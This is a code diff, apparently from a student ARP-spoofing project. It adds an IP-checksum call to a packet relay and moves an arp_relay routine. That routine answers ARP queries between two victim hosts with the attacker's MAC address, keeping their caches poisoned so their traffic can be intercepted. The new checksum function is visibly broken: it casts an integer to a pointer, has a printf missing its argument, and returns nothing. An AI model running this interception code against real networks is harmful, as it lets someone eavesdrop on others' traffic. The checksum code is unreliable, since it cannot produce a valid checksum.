@@ -197,6 +197,7 @@ int relay(const char *dev, pcap_t *pcap, u_int8_t *attacker_mac, u_int8_t *sende
                     }
                     continue;
                 }
+                calc_checksum_ip(&(ip_pkt->ip_));
                 int res = pcap_sendpacket(pcap, (u_char *)pkt, header->len);
                 if (res != 0)
                 {
@@ -213,60 +214,18 @@ int relay(const char *dev, pcap_t *pcap, u_int8_t *attacker_mac, u_int8_t *sende
     return 0;
 }
 
-void *arp_relay(void *arp_info)
+uint16_t calc_checksum_ip(IpHdr *ip_)
 {
-    ArpInfo *f_arp_info = (ArpInfo *)arp_info;
-    pcap_t *pcap = f_arp_info->pcap;
-    u_int8_t *target_mac = f_arp_info->target_mac;
-    u_int8_t *sender_mac = f_arp_info->sender_mac;
-    u_int8_t *attacker_mac = f_arp_info->attacker_mac;
-    u_int8_t *target_ip = f_arp_info->target_ip;
-    u_int8_t *sender_ip = f_arp_info->sender_ip;
-    const char *dev = f_arp_info->dev;
-    struct pcap_pkthdr *header;
-    const u_char *packet;
-    EthArpPacket *pkt;
-    int res;
-    while (true)
+    uint32_t sum = 0;
+    uint16_t *block = (uint16_t *)ip_;
+    uint16_t *carry = (uint16_t *)sum;
+
+    for (int i = 0; i < 10; i++)
     {
-        res = pcap_next_ex(pcap, &header, &packet);
-        pkt = (EthArpPacket *)packet;
-        if (res == 0)
-            continue;
-        if (res == PCAP_ERROR || res == PCAP_ERROR_BREAK)
-        {
-            printf("pcap_next_ex return %d(%s)\n", res, pcap_geterr(pcap));
-            break;
-        }
-
-        if ((pkt->eth_.type_ == htons(EthHdr::Arp)) && (pkt->arp_.pro_ == htons(EthHdr::Ip4)) && (if_same_mac(pkt->arp_.smac_, target_mac)) && (if_same_ip(pkt->arp_.tip, sender_ip)))
-        {
-            printf("where is sender?\n");
-            request(dev, pcap, target_mac, attacker_mac, attacker_mac, sender_ip, target_mac, target_ip, 1);
-            continue;
-        }
-
-        if ((pkt->eth_.type_ == htons(EthHdr::Arp)) && (pkt->arp_.pro_ == htons(EthHdr::Ip4)) && (if_same_mac(pkt->arp_.smac_, sender_mac)) && (if_same_ip(pkt->arp_.tip, target_ip)))
-        {
-            printf("where is target?\n");
-            request(dev, pcap, sender_mac, attacker_mac, attacker_mac, target_ip, sender_mac, sender_ip, 1);
-            continue;
-        }
-
-        // if ((((EthArpPacket *)packet)->eth_.type_ == htons(EthHdr::Arp)) && (((EthArpPacket *)packet)->arp_.pro_ == htons(EthHdr::Ip4)) && (if_same_mac(((EthArpPacket *)packet)->arp_.smac_, target_mac)) && (if_same_ip(((EthArpPacket *)packet)->arp_.tip, sender_ip)))
-        // {
-        //     printf("where is sender?\n");
-        //     request(dev, pcap, target_mac, attacker_mac, attacker_mac, sender_ip, target_mac, target_ip, 1);
-        //     continue;
-        // }
-
-        // if ((((EthArpPacket *)packet)->eth_.type_ == htons(EthHdr::Arp)) && (((EthArpPacket *)packet)->arp_.pro_ == htons(EthHdr::Ip4)) && (if_same_mac(((EthArpPacket *)packet)->arp_.smac_, sender_mac)) && (if_same_ip(((EthArpPacket *)packet)->arp_.tip, target_ip)))
-        // {
-        //     printf("where is target?\n");
-        //     request(dev, pcap, sender_mac, attacker_mac, attacker_mac, target_ip, sender_mac, sender_ip, 1);
-        //     continue;
-        // }
+        sum += block[i];
     }
+
+    printf("sum : %d\n");
 }
 
 void *rly(void *arp_info)
@@ -348,5 +307,61 @@ void *rly(void *arp_info)
                 }
             }
         }
+    }
+}
+
+void *arp_relay(void *arp_info)
+{
+    ArpInfo *f_arp_info = (ArpInfo *)arp_info;
+    pcap_t *pcap = f_arp_info->pcap;
+    u_int8_t *target_mac = f_arp_info->target_mac;
+    u_int8_t *sender_mac = f_arp_info->sender_mac;
+    u_int8_t *attacker_mac = f_arp_info->attacker_mac;
+    u_int8_t *target_ip = f_arp_info->target_ip;
+    u_int8_t *sender_ip = f_arp_info->sender_ip;
+    const char *dev = f_arp_info->dev;
+    struct pcap_pkthdr *header;
+    const u_char *packet;
+    EthArpPacket *pkt;
+    int res;
+    while (true)
+    {
+        res = pcap_next_ex(pcap, &header, &packet);
+        pkt = (EthArpPacket *)packet;
+        if (res == 0)
+            continue;
+        if (res == PCAP_ERROR || res == PCAP_ERROR_BREAK)
+        {
+            printf("pcap_next_ex return %d(%s)\n", res, pcap_geterr(pcap));
+            break;
+        }
+
+        if ((pkt->eth_.type_ == htons(EthHdr::Arp)) && (pkt->arp_.pro_ == htons(EthHdr::Ip4)) && (if_same_mac(pkt->arp_.smac_, target_mac)) && (if_same_ip(pkt->arp_.tip, sender_ip)))
+        {
+            printf("where is sender?\n");
+            request(dev, pcap, target_mac, attacker_mac, attacker_mac, sender_ip, target_mac, target_ip, 1);
+            continue;
+        }
+
+        if ((pkt->eth_.type_ == htons(EthHdr::Arp)) && (pkt->arp_.pro_ == htons(EthHdr::Ip4)) && (if_same_mac(pkt->arp_.smac_, sender_mac)) && (if_same_ip(pkt->arp_.tip, target_ip)))
+        {
+            printf("where is target?\n");
+            request(dev, pcap, sender_mac, attacker_mac, attacker_mac, target_ip, sender_mac, sender_ip, 1);
+            continue;
+        }
+
+        // if ((((EthArpPacket *)packet)->eth_.type_ == htons(EthHdr::Arp)) && (((EthArpPacket *)packet)->arp_.pro_ == htons(EthHdr::Ip4)) && (if_same_mac(((EthArpPacket *)packet)->arp_.smac_, target_mac)) && (if_same_ip(((EthArpPacket *)packet)->arp_.tip, sender_ip)))
+        // {
+        //     printf("where is sender?\n");
+        //     request(dev, pcap, target_mac, attacker_mac, attacker_mac, sender_ip, target_mac, target_ip, 1);
+        //     continue;
+        // }
+
+        // if ((((EthArpPacket *)packet)->eth_.type_ == htons(EthHdr::Arp)) && (((EthArpPacket *)packet)->arp_.pro_ == htons(EthHdr::Ip4)) && (if_same_mac(((EthArpPacket *)packet)->arp_.smac_, sender_mac)) && (if_same_ip(((EthArpPacket *)packet)->arp_.tip, target_ip)))
+        // {
+        //     printf("where is target?\n");
+        //     request(dev, pcap, sender_mac, attacker_mac, attacker_mac, target_ip, sender_mac, sender_ip, 1);
+        //     continue;
+        // }
     }
 }
